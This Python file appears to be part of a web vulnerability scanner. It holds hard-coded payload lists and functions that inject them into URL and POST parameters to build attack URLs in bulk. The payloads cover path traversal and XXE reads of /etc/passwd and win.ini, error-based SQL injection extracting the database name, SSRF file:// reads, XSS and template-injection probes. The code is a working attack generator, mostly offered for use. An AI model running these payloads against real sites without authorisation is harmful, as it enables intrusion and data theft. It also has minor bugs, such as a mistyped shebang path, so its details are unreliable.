#!/user/bin/env python3
# -*- coding: utf-8 -*-
def _header_attack_tihuan_url_canshu_work(poc):
    dir_poc = ["/../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
               '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd',
               '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/windows/win.ini',
               "/../../../../../../../C:/windows/win.ini",
               "\c$\windows\win.ini"]
    sql_poc = [" AND 1=2 --+", "1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)",
               "' AND 1=2 --+", "1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)",
               "1%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)", " OR NOT (1=2) --+", "\" AND 1=2 --+",
               "\" OR NOT (1=2) --+", "' AND 1=2 --+", "' OR NOT (1=2) --+", "%29%28%22%27",
               "\" AND updatexml(1,concat(0x7e,database(),0x7e),1)-- +",
               ")%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)-- +"]
    ssrf_poc = [
        "file:///etc/passwd",
        "file:///C:/windows/win.ini",
    ]
    xss_poc = [
        '"-prompt(1)-"',
        "<script>alert(1)</script>"
    ]
    mb_poc = [
        "<%= 777 * 777 %>",
        "${777*777}",
        "{{777*777}}",
        "$eval('777*777')"
    ]
    xxe_poc = [
        """
        <?xml version="1.0"?>
        <!DOCTYPE data [
        <!ELEMENT data (#ANY)>
        <!ENTITY file SYSTEM "file:///etc/passwd">
        ]>
        <data>&file;</data>
        """,
        """
        <?xml version="1.0"?>
        <!DOCTYPE data [
        <!ELEMENT data (#ANY)>
        <!ENTITY file SYSTEM "file:///C:/windows/win.ini">
        ]>
        <data>&file;</data>
        """
    ]

    if poc == "sql":
        return sql_poc
    if poc == "xss":
        return xss_poc
    if poc == "dir":
        return dir_poc
    if poc == "ssrf":
        return ssrf_poc
    if poc == "mb":
        return mb_poc
    if poc == "xxe":
        return xxe_poc

def attack_tihuan_url_canshu_work(__base_attack_url,poc):
    url_list = []
    att_poc = _header_attack_tihuan_url_canshu_work(poc)

    for i in __base_attack_url:
        baseurl_cs = i.split('=')[1]
        base_poc = []
        baseurl_other = i.split('=')[2:]
        if "&" in baseurl_cs:
            p = "&".join(baseurl_cs.split('&')[1:])
            for poc in att_poc:
                cs = poc + "&" + p
                base_poc.append(cs)
        else:
            for poc in att_poc:
                base_poc.append(poc)
        for baseurl_cs in base_poc:
            baseurl = i.split('=')[0] + "=" + baseurl_cs

            if "=".join(baseurl_other):
                baseurl = i.split('=')[0] + "=" + baseurl_cs + "=" + "=".join(baseurl_other)

            if baseurl not in url_list:
                url_list.append(baseurl.strip())
            # print(baseurl)
    return url_list

def post_attack_tihuan_url_canshu_work(baseurl,data,poc):
    att_poc = _header_attack_tihuan_url_canshu_work(poc)
    new_base_url = []
    for i in data:
        for f_poc in att_poc:
            if i['path']:
                if 'parmes' in i:
                    url = baseurl.strip("/ ") + "/" + i['path'].strip("/ ") + "&attack&" + f"={f_poc}&".join(i['parmes']) + f"={f_poc}"
                else:
                    url = baseurl.strip("/ ") +"/"+ i['path'].strip("/ ") + "&attack&" + f"={poc}"
                if url not in new_base_url:
                    new_base_url.append(url)


    return new_base_url if new_base_url else None


